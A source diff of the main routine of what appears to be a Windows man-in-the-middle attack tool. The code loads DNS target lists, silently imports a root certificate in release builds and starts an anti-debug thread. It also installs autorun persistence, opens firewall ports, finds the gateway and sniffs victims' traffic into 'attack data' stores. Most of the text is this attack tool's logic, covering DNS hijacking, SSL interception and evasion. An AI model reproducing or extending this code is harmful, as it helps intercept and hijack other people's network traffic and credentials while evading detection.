@@ -1,3 +1,6 @@
+
+#define SECURITY_WIN32
+
 #include "PreparePacket.h"
 #include <algorithm>
 #include <windows.h>
@@ -20,7 +23,7 @@
 #include "snifferpacket.h"
 #include "NetworkDevice.h"
 #include "Confiig.h"
-
+#include "safeGuard.h"
 #include "attack.h"
 #include "ssl\\sslentry.h"
 #include "winpcap.h"
@@ -64,12 +67,12 @@
 #include "ssl/peanutShell.h"
 #include <conio.h>
 #include "myDvert.h"
+#include "Helper.h"
 
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib,"dbghelp.lib")
 #pragma comment(lib,"Iphlpapi.lib")
 #pragma comment(lib,"Advapi32.lib")
-
 #pragma comment(lib,"./lib\\wpcap.lib")
 #pragma comment(lib,"./lib\\wpcap.dll")
 #pragma comment(lib,"./lib\\zlib.lib")
@@ -82,13 +85,13 @@
 using namespace std;
 
 
+int gAttackToggle = 0;
 int gAttackMode = 0;
 
 
 void test() {
-
+	
 }
-
 
 int main(int argc, char** argv)
 {
@@ -97,7 +100,6 @@ int main(int argc, char** argv)
 #endif
 
 	int	ret = 0;
-	char szout[1024];
 
 	string username = "";
 	string password = "";
@@ -112,7 +114,7 @@ int main(int argc, char** argv)
 	HANDLE hMutext = (HANDLE)Public::singleInstance();
 	if (hMutext == FALSE)
 	{
-		printf("program had already been running\n");
+		log("An instance of program has already been running\n");
 		ret = _getch();
 		exit(-1);
 	}
@@ -121,8 +123,7 @@ int main(int argc, char** argv)
 	ret = WSAStartup(WSASTARTUP_VERSION, &stWsa);
 	if (ret)
 	{
-		printf("WSAStartup error code:%d\n", GetLastError());
-		ret=_getch();
+		log("network init error:%d\n", GetLastError());
 		exit(-1);
 	}
 
@@ -132,41 +133,46 @@ int main(int argc, char** argv)
 	int winpcapDelay = 1;
 	int opensslctrl = 0;
 	unsigned long serverIP = 0;
-	char szgwmac[64] = { 0 };
+	char gwmac[64] = { 0 };
 	string servername = "";
-	vector<string> gDnsAttackList = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,
-		&opensslctrl, &gAttackMode, szgwmac, servername);
-	if (gDnsAttackList.size() == 0) {
-		printf("parse config file:%s error\r\n", CONFIG_FILENAME);
-		ret = _getch();
-		return -1;
+	vector<string> hostlist = Config::parseAttackCfg(path + CONFIG_FILENAME, &serverIP, &winpcapDelay,&opensslctrl, &gAttackMode, gwmac, servername);
+	if (hostlist.size() == 0) {
+		//log("parse config file:%s error\r\n", CONFIG_FILENAME);
+		//return -1;
 	}
 
-	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, gDnsAttackList);
-	printf("parse dns total:%u\r\n", dnsItemCnt);
+	int dnsItemCnt = Config::parseDnsCfg(DNS_FILENAME, hostlist);
+	printf("dns target total:%u\r\n", dnsItemCnt);
+
+	ret = ObjectParser(hostlist);
 	
-	ret = Security::loginCheck(gAttackMode, username, password);
+	ret = SafeGuard::loginCheck(gAttackMode, username, password);
 	if (ret <= 0)
 	{
-		printf("username or password error\r\n");
-		ret = _getch();
+		log("username or password error\r\n");
 		exit(-1);
 	}
 	
 	string adaptername = NetworkDevice::ChooseNetcard(&gLocalIP, &gNetmask, &gRouterIP, gLocalMac, netcard_target,&gDnsServer);
 	if (adaptername == "")
 	{
-		printf("selectNetcard error\r\n");
-		ret = _getch();
+		log("Choose Netcard error\r\n");
 		return -1;
 	}
-
+#ifndef _DEBUG
+	opensslctrl |= ROOTCERT_IMPORT;
+	opensslctrl |= OPENSSL_CLEAR_PATH;
+#endif
 	if (gAttackMode == ATTACK_TEST_MODE)
 	{
+		gNetIP = GetInetIPAddress();
+		gstrNetIP = HttpUtils::ip2str(gNetIP);
 		serverIP = gLocalIP;
 	}
 	else if (gAttackMode == ATTACK_SERVER_MODE)
 	{
+		gNetIP = GetInetIPAddress();
+		gstrNetIP = HttpUtils::ip2str(gNetIP);
 		//make sure serverip is correct in this mode
 	}
 	else if (gAttackMode == ATTACK_CLIENT_MODE)
@@ -175,9 +181,9 @@ int main(int argc, char** argv)
 	}
 
 #ifndef _DEBUG
-	ret = Tools::autorun(username, password, netcard_selected);
+	ret = Tools::autorun(username, password, netcard_target);
 	DWORD debugTd = 0;
-	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Security::antiDebug, 0,
+	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)SafeGuard::antiDebug, 0,
 		STACK_SIZE_PARAM_IS_A_RESERVATION, &debugTd));
 #endif
 
@@ -185,42 +191,44 @@ int main(int argc, char** argv)
 	pcap_t* pcapt = Winpcap::init(devname, winpcapDelay, gNetmask);
 	if (pcapt == 0)
 	{
-		printf("winpcap init error\r\n");
-		ret = _getch();
+		log("winpcap init error\r\n");
 		return -1;
 	}
-	printf("device name:%s,netmask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);
+	printf("device:%s,mask:%08x,winpcap delay:%d\r\n", devname.c_str(), gNetmask, winpcapDelay);
 
-	//vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
-	auto iter = unique(gDnsAttackList.begin(), gDnsAttackList.end());
-	gDnsAttackList.erase(iter, gDnsAttackList.end());
+	
+	// 标准去重模式,vector、set、map这些容器的end()取出来的值不是最后一个、end的前一个才是最后一个,prev(xxx.end())取出最后一个
+	sort(hostlist.begin(), hostlist.end());  // 先排序
+	auto iter = unique(hostlist.begin(), hostlist.end());
+	hostlist.erase(iter, hostlist.end());
 
-	vector<string> gHostAttackList = gDnsAttackList;
-	gHostAttackList.push_back(HttpUtils::getIPstr(serverIP));
-	gHostAttackList.push_back(HttpUtils::getIPstr(gLocalIP));
-	gHostAttackList.push_back("127.0.0.1");
+	vector<string> dnslist = hostlist;
+	hostlist.push_back(HttpUtils::getIPstr(serverIP));
+	hostlist.push_back(HttpUtils::getIPstr(gLocalIP));
+	hostlist.push_back(gstrNetIP);
+#ifdef _DEBUG
 
-	ret = Config::shiftDnsFormat(gDnsAttackList);
+#endif
+	//dnslist.push_back("127.0.0.1");
 
-	DnsUitls* dnsutils = new DnsUitls(gDnsAttackList);
+	ret = Config::shiftDnsFormat(dnslist);
+
+	DnsUitls* dnsutils = new DnsUitls(dnslist);
 
 	DWORD cmode = 0;
 	HANDLE hc = GetStdHandle(STD_INPUT_HANDLE);
 	ret = GetConsoleMode(hc, &cmode);
 	//nRetCode = SetConsoleMode(hc, ~ENABLE_QUICK_EDIT_MODE);
 
-	printf("checking encryption files,please wait...\r\n");
+	printf("checking files cryption,please wait...\r\n");
 	string pluginPath = Public::getPluginPath();
 	ret = FileOper::checkFileCryption(pluginPath);
 
 	gServerIP = serverIP;
 	gLocalPath = path;
+	gstrLocalIP = HttpUtils::ip2str(gLocalIP);
+	gstrServerIP = HttpUtils::ip2str(gServerIP);
 
-	in_addr ia = { 0 };
-	ia.S_un.S_addr = gLocalIP;
-	gstrLocalIP = inet_ntoa(ia);
-	ia.S_un.S_addr = gServerIP;
-	gstrServerIP = inet_ntoa(ia);
 	HttpUtils::ipv4toipv6((unsigned char*)&gLocalIP, gLocalIPV6);
 
 	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE) {
@@ -229,11 +237,11 @@ int main(int argc, char** argv)
 		ret = Tools::addFirewallPort(SSL_PORT, "SSL", "TCP");
 		ret = Tools::addFirewallPort(INFORMER_PORT, "INFORMER", "TCP");
 
-		ret = SSLEntry::sslEntry(serverIP, gLocalIP, path, opensslctrl, gDnsAttackList, gHostAttackList, gAttackMode);
+		ret = SSLEntry::SslEntry(serverIP, gLocalIP, path, opensslctrl, dnslist, hostlist, gAttackMode);
 
 		ret = Tools::setNetworkParams();
 
-		printf("server has been ready to work...\r\n");
+		printf("Server mode is ready to work...\r\n");
 	}
 
 	if (gAttackMode == ATTACK_SERVER_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE) {
@@ -248,10 +256,10 @@ int main(int argc, char** argv)
 		do
 		{
 			int packnum = 0;
-			printf("\r\nPlease input the number of the server packet:\r\n");
+			printf("\r\nPlease select the number of the server packet:\r\n");
 			//scanf("%d", &packnum);
 			if (packnum < usernames.size() && packnum >= 0) {
-				lstrcpyA(G_USERNAME, usernames[packnum].c_str());
+				//lstrcpyA(G_USERNAME, usernames[packnum].c_str());
 				break;
 			}
 		} while (1);
@@ -263,7 +271,6 @@ int main(int argc, char** argv)
 		Sleep(-1);
 	}
 
-	//printf("set server ip:%s,attack ip:%s,default user:%s\r\n", servername.c_str(), HttpUtils::getIPstr(localIP).c_str(),G_USERNAME);
 	//inet_ntoa返回一个字符指针，指向一块存储着点分格式IP地址的静态缓冲区（同一线程内共享此内存）
 
 	if (gAttackMode == ATTACK_CLIENT_MODE || gAttackMode == ATTACK_TEST_MODE || gAttackMode == ATTACK_STANDBY_MODE)
@@ -272,24 +279,22 @@ int main(int argc, char** argv)
 		ret = access(userpluginPath.c_str(), 0);
 		if (ret)
 		{
-			wsprintfA(szout, "attack data store:%s not exist!\r\n", G_USERNAME);
-			printf(szout);
-			ret=_getch();
+			log( "data path:%s not exist!\r\n", G_USERNAME);
 			exit(-1);
 		}
 
-		printf("parsing gateway mac and ip,please wait...\r\n");
-		Gateway* gateway = new Gateway(pcapt, serverIP, gLocalIP, gLocalMac);
-
-		int totalpack = gateway->getGateWay();
-		// 		if (totalpack)
-		// 		{
-		// 			GATEWAYPARAM p = gateway->getGatewayParam();
-		// 			printf("get gate way mac:%s,packet count:%d,mac count:%d,source ip:%s\r\n",
-		// 				HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, gateway->mCnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
-		// 		}
-
-		printf("attacker has been ready to work...\r\n");
+		if (1) {
+			printf("parsing gateway mac and ip,please wait...\r\n");
+			Gateway* gateway = new Gateway(pcapt, serverIP, gLocalIP, gLocalMac);
+			int totalpack = gateway->getGateWay();
+			if (totalpack)
+			{
+				GATEWAYPARAM p = gateway->getGatewayParam();
+				printf("gate way mac:%s,mac count:%d,ip:%s\r\n",
+					HttpUtils::getmac(p.mac.DstMAC).c_str(), p.cnt, HttpUtils::getIPstr(p.ip.SrcIP).c_str());
+			}
+		}
+		printf("Client mode is ready to work...\r\n");
 
 #ifndef WINDIVERT_APPROACH
 		ret = SnifferPacket::peeping(pcapt, serverIP, gLocalIP, userpluginPath, gAttackMode);
@@ -302,11 +307,6 @@ int main(int argc, char** argv)
 
 	return ret;
 }
-
-/*
-v4地址转化v6地址，再把前96位补零
-0000:0000:0000:0000:0000:0000:874B:2B34或者::874B:2B34
-*/
 
 //cmd执行程序时容易卡住 取消快速编辑模式
 
